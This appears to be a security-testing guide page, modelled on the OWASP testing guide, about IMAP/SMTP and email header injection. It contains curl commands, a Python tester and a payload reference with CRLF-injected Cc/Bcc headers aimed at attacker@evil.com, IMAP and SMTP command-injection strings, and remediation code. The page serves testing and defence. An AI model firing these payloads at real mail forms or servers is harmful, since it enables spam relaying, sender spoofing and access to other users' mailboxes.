# WSTG-INPV-10: Testing for IMAP/SMTP Injection

## Test ID
WSTG-INPV-10

## Test Name
Testing for IMAP/SMTP Injection

## High-Level Description

IMAP/SMTP Injection occurs when user input is incorporated into mail server commands without proper validation. Attackers can manipulate email functionality to send spam, access other users' mailboxes, execute arbitrary IMAP/SMTP commands, or bypass email-based security controls.

---

## What to Check

- [ ] Email header injection
- [ ] IMAP command injection
- [ ] SMTP command injection
- [ ] CC/BCC injection
- [ ] From address spoofing
- [ ] Newline/CRLF injection

---

## How to Test

### Step 1: Test Email Header Injection

```bash
#!/bin/bash
TARGET="https://target.com/contact"

# Test email header injection via form
echo "[*] Testing email header injection..."

# CC injection
curl -s -X POST "$TARGET" \
    -d "name=Test" \
    -d "email=test@test.com%0ACc:attacker@evil.com" \
    -d "message=Test message"

# BCC injection
curl -s -X POST "$TARGET" \
    -d "name=Test" \
    -d "email=test@test.com%0ABcc:attacker@evil.com" \
    -d "message=Test message"

# Subject injection
curl -s -X POST "$TARGET" \
    -d "name=Test%0ASubject:Injected Subject" \
    -d "email=test@test.com" \
    -d "message=Test"
```

### Step 2: IMAP/SMTP Injection Tester

```python
#!/usr/bin/env python3
"""
IMAP/SMTP Injection Vulnerability Tester
"""

import requests
from urllib.parse import quote

class MailInjectionTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # Email injection payloads
    PAYLOADS = {
        'header_injection': [
            # CC/BCC injection
            "test@test.com\nCc: attacker@evil.com",
            "test@test.com\r\nCc: attacker@evil.com",
            "test@test.com%0ACc:attacker@evil.com",
            "test@test.com%0D%0ABcc:attacker@evil.com",

            # Subject injection
            "test@test.com\nSubject: Injected",
            "test@test.com%0ASubject:INJECTED",

            # Body injection
            "test@test.com\n\nInjected body content",
            "test@test.com%0A%0AInjected%20body",

            # From injection
            "test@test.com\nFrom: spoofed@evil.com",
        ],
        'imap_commands': [
            # IMAP command injection
            'test"\r\nA001 LOGOUT\r\n',
            'test" FETCH 1:* BODY[]',
            'test"\nA001 SELECT INBOX\nA002 FETCH 1:* FLAGS',
            'test%22%0D%0AA001%20LOGOUT',
        ],
        'smtp_commands': [
            # SMTP command injection
            'test@test.com\r\nRCPT TO:<attacker@evil.com>',
            'test@test.com\nDATA\nInjected message\n.\n',
            'test@test.com%0D%0ARCPT%20TO:<attacker@evil.com>',
        ],
    }

    def test_header_injection(self, email_param='email'):
        """Test email header injection"""
        print("\n[*] Testing email header injection...")

        for payload in self.PAYLOADS['header_injection']:
            try:
                response = self.session.post(
                    self.url,
                    data={
                        email_param: payload,
                        'name': 'Test User',
                        'subject': 'Test Subject',
                        'message': 'Test message'
                    }
                )

                # Check for success indicators
                if response.status_code == 200:
                    if 'sent' in response.text.lower() or \
                       'success' in response.text.lower():
                        print(f"[WARN] Email possibly sent with injection")
                        print(f"  Payload: {payload[:50]}")
                        self.findings.append({
                            'type': 'Email Header Injection',
                            'payload': payload,
                            'severity': 'High'
                        })

                # Check for errors that confirm mail processing
                if 'mail' in response.text.lower() or \
                   'smtp' in response.text.lower():
                    print(f"[INFO] Mail-related response detected")

            except Exception as e:
                pass

    def test_imap_injection(self, user_param='username'):
        """Test IMAP command injection"""
        print("\n[*] Testing IMAP command injection...")

        for payload in self.PAYLOADS['imap_commands']:
            try:
                response = self.session.post(
                    self.url,
                    data={
                        user_param: payload,
                        'password': 'test'
                    }
                )

                # Check for IMAP-related responses
                if 'OK' in response.text or \
                   'LOGOUT' in response.text or \
                   'SELECT' in response.text:
                    print(f"[VULN] IMAP command injection possible!")
                    self.findings.append({
                        'type': 'IMAP Command Injection',
                        'payload': payload,
                        'severity': 'Critical'
                    })

            except Exception as e:
                pass

    def test_crlf_injection(self, subject_param='subject'):
        """Test CRLF injection in email fields"""
        print("\n[*] Testing CRLF injection...")

        crlf_payloads = [
            "Subject\r\nCc: attacker@evil.com\r\n\r\nInjected body",
            "Subject%0d%0aCc:%20attacker@evil.com",
            "Subject\nBcc: attacker@evil.com",
        ]

        for payload in crlf_payloads:
            try:
                response = self.session.post(
                    self.url,
                    data={
                        'email': 'test@test.com',
                        subject_param: payload,
                        'message': 'Test'
                    }
                )

                if response.status_code == 200:
                    print(f"[INFO] Payload accepted: {payload[:40]}")

            except Exception as e:
                pass

    def test_from_spoofing(self):
        """Test From address spoofing"""
        print("\n[*] Testing From address spoofing...")

        spoofed_addresses = [
            "admin@target.com",
            "support@target.com",
            "noreply@target.com",
        ]

        for email in spoofed_addresses:
            try:
                response = self.session.post(
                    self.url,
                    data={
                        'email': email,
                        'name': 'Admin',
                        'message': 'Spoofed message'
                    }
                )

                if 'sent' in response.text.lower():
                    print(f"[WARN] Email sent as: {email}")
                    self.findings.append({
                        'type': 'From Address Spoofing',
                        'email': email,
                        'severity': 'Medium'
                    })

            except Exception as e:
                pass

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("IMAP/SMTP INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo mail injection vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload'][:60]}")

    def run_tests(self):
        """Run all mail injection tests"""
        self.test_header_injection()
        self.test_crlf_injection()
        self.test_from_spoofing()
        self.test_imap_injection()
        self.generate_report()

# Usage
tester = MailInjectionTester("https://target.com/contact")
tester.run_tests()
```

### Step 3: Payload Reference

```
# Email Header Injection
test@test.com%0ACc:attacker@evil.com
test@test.com%0ABcc:attacker@evil.com
test@test.com%0ASubject:Injected
test@test.com%0AContent-Type:text/html%0A%0A<script>alert(1)</script>

# CRLF Variants
%0A = Line Feed
%0D = Carriage Return
%0D%0A = CRLF
\r\n = CRLF (raw)

# IMAP Commands
A001 LOGIN user pass
A002 SELECT INBOX
A003 FETCH 1:* (FLAGS BODY[])
A004 SEARCH ALL
A005 LOGOUT

# SMTP Commands
HELO attacker.com
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@target.com>
DATA
Subject: Injected

Injected body
.
QUIT
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Burp Suite | Intercept and modify |
| Telnet | Direct SMTP/IMAP testing |
| swaks | SMTP testing |
| Custom scripts | Automated testing |

---

## Remediation

```python
# Python - Proper email handling
import re
from email.utils import parseaddr

def validate_email(email):
    """Validate email address and prevent injection"""
    # Check for newlines/CRLF
    if '\r' in email or '\n' in email:
        raise ValueError("Invalid email: contains newlines")

    # Parse and validate
    _, addr = parseaddr(email)
    if not addr:
        raise ValueError("Invalid email format")

    # Check for valid format
    email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    if not re.match(email_regex, addr):
        raise ValueError("Invalid email format")

    return addr

# Use libraries that handle headers safely
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

msg = MIMEMultipart()
msg['From'] = 'noreply@example.com'
msg['To'] = validate_email(user_email)
msg['Subject'] = subject.replace('\n', '').replace('\r', '')
```

```php
<?php
// PHP - Validate and sanitize
function sanitize_email_header($value) {
    // Remove newlines and carriage returns
    $value = str_replace(["\r", "\n", "%0a", "%0d"], '', $value);
    return $value;
}

// Use filter_var for email validation
$email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
if (!$email) {
    die('Invalid email');
}

// Use mail headers safely
$headers = "From: noreply@example.com\r\n";
$headers .= "Reply-To: " . sanitize_email_header($email) . "\r\n";
?>
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| IMAP command injection | 9.1 | Critical |
| SMTP command injection | 8.1 | High |
| Email header injection | 6.5 | Medium |
| From address spoofing | 4.3 | Medium |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-93** | Improper Neutralization of CRLF Sequences |
| **CWE-88** | Improper Neutralization of Argument Delimiters in a Command |

---

## Checklist

```
[ ] Email header injection tested
[ ] CC/BCC injection tested
[ ] Subject injection tested
[ ] CRLF injection tested
[ ] IMAP commands tested
[ ] SMTP commands tested
[ ] From spoofing tested
[ ] Findings documented
```
